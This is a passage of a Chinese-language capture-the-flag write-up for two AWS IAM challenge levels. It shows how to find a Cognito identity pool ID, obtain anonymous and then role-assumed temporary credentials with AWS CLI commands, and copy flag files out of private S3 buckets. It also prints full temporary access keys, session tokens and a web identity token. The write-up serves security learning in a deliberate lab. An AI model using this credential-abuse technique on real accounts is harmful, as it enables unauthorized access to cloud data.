<p>简单来说，如果我们找到了身份池的id，就能获取匿名用户的id，就可以获取临时凭据，然后就可以获取对应的权限</p>
<p>因为配置并没有阻止我们注册用户</p>
<p>首先寻找pool id</p>
<div class="highlight"><pre><span></span><span class="mi">1</span><span class="err">、</span><span class="n">通过应用程序代码查找使用Cognito的部分</span><span class="err">，</span><span class="n">并寻找可能存在identity_pool_id的位置</span><span class="err">，</span><span class="n">通常在一些JS文件或者接口中可能存在</span><span class="err">。</span>

<span class="mi">2</span><span class="err">、</span><span class="n">通过监控分析网络流量分析捕获应用程序与Cognito之间的通信</span><span class="err">。</span><span class="n">在捕获的网络流量中</span><span class="err">，</span><span class="n">搜索包含</span> <span class="n">identity_pool_id</span> <span class="n">的请求或响应</span><span class="err">。</span>

<span class="mi">3</span><span class="err">、</span><span class="n">通过搜寻查找一些配置文件或环境变量及启动脚本等获取Cognito相关的配置信息</span><span class="err">。</span>

<span class="mi">4</span><span class="err">、</span><span class="n">通过分析应用程序日志</span><span class="err">，</span><span class="n">查找</span> <span class="n">identity_pool_id</span> <span class="n">的信息</span><span class="err">。</span><span class="n">有时日志文件会记录与身份池相关的操作或配置</span><span class="err">。</span>

<span class="mi">5</span><span class="err">、</span><span class="n">通过aws控制台或CLI命令行获取identity_pool_id</span><span class="err">，</span><span class="n">前提是需要有一定权限</span><span class="err">。</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241011105952-e3128a12-877c-1.png"/></p>
<p>生成唯一身份id</p>
<div class="highlight"><pre><span></span>aws cognito-identity get-id --identity-pool-id <span class="s2">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"</span> --region us-east-1
<span class="o">{</span>
  <span class="s2">"IdentityId"</span>: <span class="s2">"us-east-1:9bece720-ce90-40dc-9217-06b6c0dc3d0f"</span>
<span class="o">}</span>
</pre></div>
<p>获取临时凭据</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">cognito</span><span class="o">-</span><span class="n">identity</span> <span class="n">get</span><span class="o">-</span><span class="n">credentials</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">identity</span> <span class="o">--</span><span class="n">identity</span><span class="o">-</span><span class="n">id</span> <span class="s">"us-east-1:9bece720-ce90-4</span>
<span class="s">0dc-9217-06b6c0dc3d0f"</span> <span class="o">--</span><span class="n">region</span> <span class="n">us</span><span class="o">-</span><span class="n">east</span><span class="o">-</span><span class="mi">1</span>
<span class="o">{</span>
    <span class="s">"IdentityId"</span><span class="o">:</span> <span class="s">"us-east-1:9bece720-ce90-40dc-9217-06b6c0dc3d0f"</span><span class="o">,</span>
    <span class="s">"Credentials"</span><span class="o">:</span> <span class="o">{</span>
        <span class="s">"AccessKeyId"</span><span class="o">:</span> <span class="s">"ASIARK7LBOHXAOAVIZHV"</span><span class="o">,</span>
        <span class="s">"SecretKey"</span><span class="o">:</span> <span class="s">"BLI2DsSRnERlPTZhqnFAjyskXqfO8RW3+0eQa5nK"</span><span class="o">,</span>
        <span class="s">"SessionToken"</span><span class="o">:</span> <span class="s">"IQoJb3JpZ2luX2VjEB8aCXVzLWVhc3QtMSJGMEQCIGRq9S9Idz2+Q83BMu6RSTsPkCZ</span>
<span class="s">OU5FjMLkiMgH97VQYAiABFsPena3nIqDIuaMuO3BZ9q9b1ynshaGfhS6eLo4jzyrJBQh4EAAaDDA5MjI5Nzg1MTM3NCI</span>
<span class="s">MXEuPAkmAnUBwpq1lKqYFeHvyaa4b9AO1DU7gYPpNmf2o4qiOD8wFZ9pNuGSCCrXRoZH1EpLa7jkmEDcNPZq7DOgHZMb</span>
<span class="s">jpcidJCChYaW6MU175DSAC9yPnRgpXa9Qgu72Rv9T9QoX37VxmCr8Kp4z+eyizKjBJETOrHipezS3PD+J+kEPHbVG7CC</span>
<span class="s">IXvz3BsxbKKBPemZWsecZyFn7L0vnrVArp8Cd7tc6rHehssFU7WcR/jvKaK+mPwb5vAD7tIVrzDsH7uPUHjXX4LVc6Un</span>
<span class="s">i0XYQw7nAtDVftp6k2JYzvt8vizFlbuEZ+ErsoqoY/NF8v6xnjUn/waWziloeaItI1ja0KuuZ/h2eD6UgAfHk8WIDz6o</span>
<span class="s">9a3gxynToIRg6TFMLSko2I9DElSKInFFf3kkFtXSSNz1O3QzNirBiHHcyfoKl2CjQ2sZ234wNjpZKyYIG1XXW5NLFyA2</span>
<span class="s">g/dsP29ZLXQmRC9oGfANwbZoREs7DioYjwTHFehg9XK3GH6WjNjtUilFDo+HzqNXjoYUeB7nsxO/vGLwaxRqddwLJHix</span>
<span class="s">6wE1uUJnGPCfv74tdWdk80eqy+FDBk7LQTCWJN7f2BO3ucoWIZ4fxIBe9cukaK1xPeKSqklyPKUlrThrPz+Jz8RFXfOH</span>
<span class="s">ypPGNR9YFdnwronb3eRcnXKf2vpwuSqJbeTSbbS27mJAVAFoyTbsbbNbIDaf7+DTuYo+ZOSTSeTCpCJBfzbShjFJOCLc</span>
<span class="s">mw3I6xy2y67RSSk5JV7h62M4bWD+P11OHlisdG9d2KD6EpdgLRzluLXcGhc0E1Tu8j5zVqmrDv8Aun2XJQoVotzhb2sk</span>
<span class="s">6hK6zq1m1GKNlWvlMIIoP7q+lAHBI6GCbDsbZE3KtNCLB8nXFSQOHb77Aj9XUUf59kjsj+NjA3hHODPFLW599gLzENNS</span>
<span class="s">yv/C7MObKn7gGOt4CiIZST+WRd+O4BfZ3w+T91rjhp3qWqUvFo+Ij8yMdCrQWM0gOHaHv48l2kXVGz1kT1FWwgcJPAvp</span>
<span class="s">7xk8Q4W+Dfby4+DOMLso2Fj9D1pLKOWl6pF0yI1ncD6rLNN5oNiSfpai1F2MHHsjiHxvXm+clwFwMB2/tYs9uyYlrnsi</span>
<span class="s">D6pAkVeejLg52FMEFGk5P3Rx1TXSKq37xQ+o88SZp5BkQh3l0XANkAAT6G6nqK+MhY5Dt1cM8M4X7W+Y/9Zr8WSLPq9W</span>
<span class="s">tWIZHaouWzRwchagkyBFP+zweKNItu36C3knD6YF29g4TFAlFeDFLobg1hc15I54+SBKI1YM/5lynkPNHv18vsyYZ9Tf</span>
<span class="s">ErTE9cX5jmeC4+MqzBglnrtLqv7A5Bkx2M8ipTq0a1DGM1UnXPcP2FsoYGQVWBXHugiXgqNsHwSzRY5E2ZtI7UAdivLZ</span>
<span class="s">2Mgbcg4MeX9Tnc5lnboW08mA="</span><span class="o">,</span>
        <span class="s">"Expiration"</span><span class="o">:</span> <span class="mf">1728574326.0</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>然后就是设置环境变量</p>
<div class="highlight"><pre><span></span><span class="n">export</span> <span class="n">AWS_ACCESS_KEY_ID</span><span class="o">....</span>
</pre></div>
<p>之后就是遍历存储桶寻找flag了</p>
<div class="highlight"><pre><span></span>aws s3 ls s3://wiz-privatefiles/
<span class="c1"># 2023-06-05 21:42:27       4220 cognito1.png</span>
<span class="c1"># 2023-06-05 15:28:35         37 flag1.txt</span>
</pre></div>
<pre><code>aws s3 cp s3://wiz-privatefiles/flag1.txt /tmp

cat /tmp/*
{wiz:incognito-is-always-suspicious}</code></pre>
<p>得到flag</p>
<div class="highlight"><pre><span></span><span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">incognito</span><span class="o">-</span><span class="n">is</span><span class="o">-</span><span class="n">always</span><span class="o">-</span><span class="n">suspicious</span><span class="o">}</span>
</pre></div>
<h3 data-content="1" id="d913ad978fd9a293c7fd9f2d73163d02"><strong>One final push</strong></h3>
<p>题目描述</p>
<p>Anonymous access no more. Let's see what can you do now.</p>
<p>Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</p>
<p>不再匿名访问。让我们看看你现在能做什么。<br/>
现在尝试使用已验证的角色：arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</p>
<p>查看配置</p>
<div class="highlight"><pre><span></span><span class="o">{</span>
    <span class="s">"Version"</span><span class="o">:</span> <span class="s">"2012-10-17"</span><span class="o">,</span>
    <span class="s">"Statement"</span><span class="o">:</span> <span class="o">[</span>
        <span class="o">{</span>
            <span class="s">"Effect"</span><span class="o">:</span> <span class="s">"Allow"</span><span class="o">,</span>
            <span class="s">"Principal"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"Federated"</span><span class="o">:</span> <span class="s">"cognito-identity.amazonaws.com"</span>
            <span class="o">},</span>
            <span class="s">"Action"</span><span class="o">:</span> <span class="s">"sts:AssumeRoleWithWebIdentity"</span><span class="o">,</span>     
            <span class="s">"Condition"</span><span class="o">:</span> <span class="o">{</span>
                <span class="s">"StringEquals"</span><span class="o">:</span> <span class="o">{</span>
                    <span class="s">"cognito-identity.amazonaws.com:aud"</span><span class="o">:</span> <span class="s">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</pre></div>
<p>允许来自 Cognito 身份池 <code>us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b</code> 的用户通过 AWS STS 服务获取临时凭据，并使用 <code>sts:AssumeRoleWithWebIdentity</code> 操作访问 AWS 资源。</p>
<p>如何获取通过 AWS STS 服务获取临时凭据</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sts</span> <span class="n">assume</span><span class="o">-</span><span class="n">role</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">identity</span> <span class="n">help</span>
<span class="n">assume</span><span class="o">-</span><span class="n">role</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">identity</span>
  <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">arn</span> <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
  <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">name</span> <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
  <span class="o">--</span><span class="n">web</span><span class="o">-</span><span class="n">identity</span><span class="o">-</span><span class="n">token</span> <span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
</pre></div>
<p>三次参数</p>
<p>第一name有的，第二个session随便取，第三个token需要我们自己去获得，如何获取token呢</p>
<p>首先还是获取身份id</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">cognito</span><span class="o">-</span><span class="n">identity</span> <span class="n">get</span><span class="o">-</span><span class="n">id</span> <span class="o">--</span><span class="n">identity</span><span class="o">-</span><span class="n">poo</span>
<span class="n">l</span><span class="o">-</span><span class="n">id</span> <span class="s">"us-east-1:b73cb2d2-0d00-4e77-8e80-f99d</span>
<span class="s">9c13da3b"</span>
<span class="o">{</span>
    <span class="s">"IdentityId"</span><span class="o">:</span> <span class="s">"us-east-1:157d6171-ee5f-c</span>
<span class="s">819-ce3c-93e452471370"</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241011105855-c0ff5536-877c-1.png"/></p>
<p>我们需要获取令牌，也就是token</p>
<p>然后获取token</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">cognito</span><span class="o">-</span><span class="n">identity</span> <span class="n">get</span><span class="o">-</span><span class="n">open</span><span class="o">-</span><span class="n">id</span><span class="o">-</span><span class="n">token</span> <span class="o">--</span><span class="n">i</span>
<span class="n">dentity</span><span class="o">-</span><span class="n">id</span> <span class="s">"us-east-1:157d6171-ee5f-c819-ce3</span>
<span class="s">c-93e452471370"</span>
<span class="o">{</span>
    <span class="s">"IdentityId"</span><span class="o">:</span> <span class="s">"us-east-1:157d6171-ee5f-c</span>
<span class="s">819-ce3c-93e452471370"</span><span class="o">,</span>
    <span class="s">"Token"</span><span class="o">:</span> <span class="s">"eyJraWQiOiJ1cy1lYXN0LTEtNiIsIn</span>
<span class="s">R5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOi</span>
<span class="s">J1cy1lYXN0LTE6MTU3ZDYxNzEtZWU1Zi1jODE5LWNlM2</span>
<span class="s">MtOTNlNDUyNDcxMzcwIiwiYXVkIjoidXMtZWFzdC0xOm</span>
<span class="s">I3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZG</span>
<span class="s">EzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaX</span>
<span class="s">NzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYX</span>
<span class="s">pvbmF3cy5jb20iLCJleHAiOjE3Mjg1ODA1NjIsImlhdC</span>
<span class="s">I6MTcyODU3OTk2Mn0.es3sD6dmfGxLfpfvXnHNIu31YL</span>
<span class="s">g9yKFVjuxBacU1sLvod_BjdYUtbzdy1IScXOQH7ALAY9</span>
<span class="s">jQxUdaL9DBBODtQbSpi_uia2yVazcjo6TrnR7HwYGFJL</span>
<span class="s">NO-rvQQ5JhLa_-rFNc0szta0Neq7xPhjlTqz_vYFQqXY</span>
<span class="s">nDULURYiNiEswGyV5dEUc3pblSwXNdX8iOi4a3gsdePv</span>
<span class="s">Zpsi8rHbHBq5myFLare_ahg6QOEiONaT4899bfzZN6WJ</span>
<span class="s">T7ZWt5qAcmKlyaFln8L1k8KHJGQrK8rRxR9smXJGAWJZ</span>
<span class="s">pcK8j1NUFWi8CMXBQ8UsEFm_hi1J-W10x-cKtad1sKxE</span>
<span class="s">eHOsE9xg"</span>
<span class="o">}</span>
</pre></div>
<p>再获取临时凭证</p>
<div class="highlight"><pre><span></span><span class="n">aws</span> <span class="n">sts</span> <span class="n">assume</span><span class="o">-</span><span class="n">role</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">identity</span> <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">arn</span> <span class="n">arn</span><span class="o">:</span><span class="n">aws</span><span class="o">:</span><span class="n">iam</span><span class="o">::</span><span class="mi">092297851374</span><span class="o">:</span><span class="n">role</span><span class="o">/</span><span class="n">Cognito_s3accessAuth_Role</span> <span class="o">--</span><span class="n">role</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">name</span> <span class="n">test</span> <span class="o">--</span><span class="n">web</span><span class="o">-</span><span class="n">identity</span><span class="o">-</span><span class="n">token</span> <span class="o">....</span>
</pre></div>
<p>然后又会返回key，id和token，之后就是一样的步骤了</p>
<div class="highlight"><pre><span></span><span class="n">$</span> <span class="n">aws</span> <span class="n">s3</span> <span class="n">ls</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//wiz-privatefiles-x1000</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mo">05</span> <span class="mi">15</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">27</span>       <span class="mi">4220</span> <span class="n">cognito2</span><span class="o">.</span><span class="na">png</span>
<span class="mi">2023</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mo">05</span> <span class="mi">09</span><span class="o">:</span><span class="mi">28</span><span class="o">:</span><span class="mi">35</span>         <span class="mi">40</span> <span class="n">flag2</span><span class="o">.</span><span class="na">txt</span>
<span class="n">$</span> <span class="n">aws</span> <span class="n">s3</span> <span class="n">cp</span> <span class="n">s3</span><span class="o">:</span><span class="c1">//wiz-privatefiles-x1000/flag2.txt /tmp</span>
<span class="o">.........</span>
<span class="o">{</span><span class="n">wiz</span><span class="o">:</span><span class="n">open</span><span class="o">-</span><span class="n">sesame</span><span class="o">-</span><span class="n">or</span><span class="o">-</span><span class="n">shell</span><span class="o">-</span><span class="n">i</span><span class="o">-</span><span class="n">say</span><span class="o">-</span><span class="n">openid</span><span class="o">}</span>
</pre></div>
<p>参考<a href="https://docs.aws.amazon.com/zh_cn/IAM" target="_blank">https://docs.aws.amazon.com/zh_cn/IAM</a><br/>
<a href="https://infrasec.sh/post/wiz_iam_ctf/#challenge-6" target="_blank">https://infrasec.sh/post/wiz_iam_ctf/#challenge-6</a><br/>
<a href="https://tari.moe/2023/bigiamchallenge.html" target="_blank">https://tari.moe/2023/bigiamchallenge.html</a></p>
</div>
</div>